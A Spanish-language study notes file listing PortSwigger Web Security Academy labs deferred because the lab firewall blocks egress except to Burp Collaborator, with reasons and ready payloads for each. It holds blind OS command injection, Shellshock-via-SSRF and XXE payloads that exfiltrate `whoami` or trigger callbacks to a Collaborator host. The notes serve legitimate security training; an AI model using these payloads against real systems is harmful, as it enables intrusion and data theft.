# Labs PortSwigger pendientes

Lista de labs que decidí saltar temporalmente y la razón. Cuando los retome, este archivo es el punto de entrada.

## Hallazgo importante sobre el firewall del lab (2026-05-04)

PortSwigger bloquea por firewall el tráfico saliente desde el navegador del bot a servicios externos arbitrarios: webhook.site, interactsh, requestbin, beeceptor, etc. todos quedan descartados antes de salir del entorno del lab. Solo se permite tráfico a:

- Burp Collaborator (`*.oastify.com`, `*.burpcollaborator.net`) — requiere Burp Suite Pro.
- El "exploit server" de PortSwigger cuando el lab lo provee explícitamente.

**Consecuencia operacional**: si un lab pide exfiltrar datos out-of-band y NO viene con exploit server, los workarounds tipo webhook.site no funcionan dentro del lab (sí funcionan fuera, en bug bounty real). Para esos labs hay dos rutas:
1. Burp Pro con Collaborator (oficial).
2. Auto-exfiltración same-origin: el script malicioso publica los datos robados como un comentario/post nuevo dentro del mismo lab; el atacante los lee navegando a esa página. Sin tráfico saliente.

## Labs aplazados

### OS command injection blind serie out-of-band — aplazados 2026-05-08

Los dos labs comparten la misma limitación de los XXE blind OOB: el endpoint `/feedback/submit` no refleja nada en la respuesta, no hay exploit server provisto, y el firewall del lab bloquea egress a webhook.site/interactsh/requestbin. El canal in-band vía archivos servibles (técnica del lab `lab-blind-output-redirection`) tampoco aplica porque estos labs específicamente validan que Collaborator reciba el callback. Único canal de salida: Collaborator (`*.oastify.com`), que requiere Burp Suite Professional.

Los labs anteriores del cluster (simple case, time-delays, output-redirection) ya están resueltos y documentados.

- **Blind OS command injection with out-of-band interaction**
  https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band
  Razón: `infra-externa-bloqueada-por-firewall + lab cuyo único objetivo es disparar callback DNS OOB`.
  Vector: parámetro `email` del feedback form (mismo que time-delays/output-redirection). Métrica de éxito: el panel de Collaborator recibe un DNS lookup. No hay datos que extraer, sólo confirmación de que la inyección puede iniciar tráfico saliente arbitrario. Auto-exfiltración same-origin no aplica porque el lab valida el callback en infraestructura del atacante, no en estado del server lab.

  Payload listo para retomar (con Burp Pro):
  ```
  email=x$(nslookup+COLLAB-ID.oastify.com)@y.com
  ```
  En el body URL-encoded del POST a `/feedback/submit`. Esperar el DNS lookup en el panel de Collaborator. Lab Solved.

- **Blind OS command injection with out-of-band data exfiltration**
  https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration
  Razón: misma limitación + exfil real (no solo callback). El lab pide leer `whoami` y enviarlo a Collaborator embebiéndolo en el subdominio del DNS lookup. Verificación lado-atacante: hay que mirar el subdominio recibido en Collaborator y submitear ese username como respuesta.

  Payload listo para retomar (con Burp Pro):
  ```
  email=x$(nslookup+`whoami`.COLLAB-ID.oastify.com)@y.com
  ```
  El shell evalúa los backticks: `whoami` produce `peter-XXXX`, queda como subdominio del DNS query. Collaborator muestra: `peter-XXXX.COLLAB-ID.oastify.com`. Submitear `peter-XXXX` como solución del lab.

  Nota: combinar `$(...)` y backticks en el mismo payload es necesario porque `$(...)` ya está siendo usado para mantener el formato de email; los backticks son la sustitución anidada para inyectar el output dentro del subdominio. Cuidado con espacios — `nslookup` no admite espacios entre el comando y el host, y dentro de `$(...)` el backtick anida limpio sin necesidad de espacios.

### Blind SSRF Shellshock exploitation — aplazado 2026-05-06

- **Blind SSRF with Shellshock exploitation**
  https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation
  Razón: `infra-externa-bloqueada-por-firewall + canal de exfil exclusivamente OAST`.

  Composición del lab:
  1. Mismo vector que el blind SSRF OOB detection: la cabecera `Referer` del request a un producto se pasa server-side a un componente interno.
  2. El componente interno corre CGI scripts vulnerables a **Shellshock** (CVE-2014-6271). Hay que descubrir vía sweep el host/IP del CGI dentro de `192.168.0.0/24:8080`.
  3. Una vez identificado el CGI, inyectar payload Shellshock en cabeceras controladas (típicamente `User-Agent`) que dispare un comando como `nslookup $(whoami).<collab>.oastify.com`.
  4. La métrica de éxito del lab es que Collaborator reciba un DNS lookup con el `whoami` (`peter-byOyhUQB` o similar) prependido al subdominio. Hay que enviar ese username como respuesta en la sección de "Submit solution".

  No hay reflejo in-band del whoami: el server del lab no devuelve el output de Shellshock al cliente, sólo lo ejecuta. La única forma de leer el resultado es vía DNS exfil a Collaborator. webhook.site/interactsh/requestbin no sirven (firewall del lab los descarta).

  Payload listo para retomar (con Burp Pro):
  ```http
  GET /product?productId=1 HTTP/2
  Host: <lab>.web-security-academy.net
  Referer: http://192.168.0.X:8080/cgi-bin/<script>
  User-Agent: () { :;}; /usr/bin/nslookup $(whoami).<COLLAB-ID>.oastify.com
  ```

  Sweep para descubrir IP+script CGI: enviar Intruder/script con `Referer: http://192.168.0.<octet>:8080/` + payload User-Agent inocuo, identificar respuestas distintas (200 con cuerpo del CGI vs 500 connection-refused). Una vez localizado, ya con Shellshock en User-Agent.

  Es el primer lab que combina SSRF + descubrimiento + ejecución de comando + exfil OOB; cuando se retome con Pro, vale como writeup de "cadena multietapa" más allá del SSRF puro.

### SSRF Blind con detección out-of-band — aplazado 2026-05-06

- **Blind SSRF with out-of-band detection**
  https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection
  Razón: `infra-externa-bloqueada-por-firewall + lab cuyo único objetivo es disparar callback OOB`.

  El lab tiene la cabecera `Referer` como vector vulnerable: el back-end hace una petición server-side al valor de `Referer` cuando se navega a un producto. Detectar la SSRF requiere que ese request llegue a un punto de escucha controlado por el atacante. No hay reflejo in-band ni exploit server, y la métrica de éxito del lab es literalmente "Burp Collaborator recibió un DNS o HTTP lookup". No hay forma honesta de cumplirlo sin Collaborator (`*.oastify.com`), webhook.site/interactsh/requestbin están bloqueados por el firewall.

  Payload listo para retomar (con Burp Pro):
  ```http
  GET /product?productId=1 HTTP/2
  Host: <lab-host>.web-security-academy.net
  Referer: http://COLLAB-ID.oastify.com
  ```
  Esperar un DNS lookup en el panel de Collaborator. Lab Solved.

  Nota: a diferencia de los XXE blind, acá ni siquiera la auto-exfiltración same-origin sirve, porque la "exfiltración" no existe — no hay datos que robar, sólo un callback que confirme la SSRF. La verificación es del lado del atacante (recibir el ping), no del lado del lab.

### XXE serie blind (requieren Burp Collaborator) — aplazados 2026-05-05

Los tres labs comparten la misma limitación: el endpoint `/product/stock` no refleja nada en la respuesta (blind), no hay exploit server provisto, y el firewall del lab bloquea egress a webhook.site/interactsh/requestbin. La ruta same-origin tampoco aplica porque el endpoint no almacena ni renderiza datos user-visible donde leerlos después. Único canal de salida: Collaborator (`*.oastify.com`), que requiere Burp Suite Professional.

- **Blind XXE with out-of-band interaction**
  https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction
  Razón: `infra-externa-bloqueada-por-firewall + endpoint blind sin exploit server`. Payload listo para retomar:
  ```xml
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://COLLAB.oastify.com"> ]>
  <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
  ```

- **Blind XXE with out-of-band interaction via XML parameter entities**
  https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities
  Razón: misma limitación. Lab nuevo: introduce parameter entities (`%`) para usar SYSTEM dentro de un DTD interno donde general entities no sirven.

- **Exploiting blind XXE to exfiltrate data using a malicious external DTD**
  https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-exfiltration
  Razón: requiere hostear un DTD malicioso accesible desde el server del lab. Aunque hubiera workaround para hostearlo, la exfiltración igual va a Collaborator.

Cuando se retomen (con Burp Pro): hacer los tres en orden, son progresivos. El segundo introduce parameter entities, el tercero las combina con DTD remoto para exfiltración real de archivos en blind.

### Nota: el lab "data retrieval via error messages" SÍ es resoluble sin Pro

A pesar de estar en la categoría blind XXE, el lab `lab-xxe-with-data-retrieval-via-error-messages` se completó (sesión 20e). Provee exploit server donde hospedar el DTD malicioso (whitelisted en el firewall del lab). La exfiltración va por mensaje de error in-band, no por Collaborator. Ver writeup en `blind-xxe-data-retrieval-via-error-messages/`.

Lección genérica: aplazar un lab por "blind XXE" sin verificar si tiene exploit server es prematuro. Si el exploit server está disponible, el DTD remoto puede hospedarse ahí y la exfiltración puede ir por error messages.

## Histórico de razones que pueden volver a aparecer

- **infra-externa-bloqueada-por-firewall**: lab pide exfiltración OOB y no provee exploit server. Resoluble vía Burp Pro o auto-exfiltración same-origin (no vía webhook.site).
- **exploit-server-requerido**: lab depende de inducir a la víctima a visitar URL controlada por el atacante; para eso PortSwigger normalmente provee un "exploit server" gratuito en la barra superior del lab.
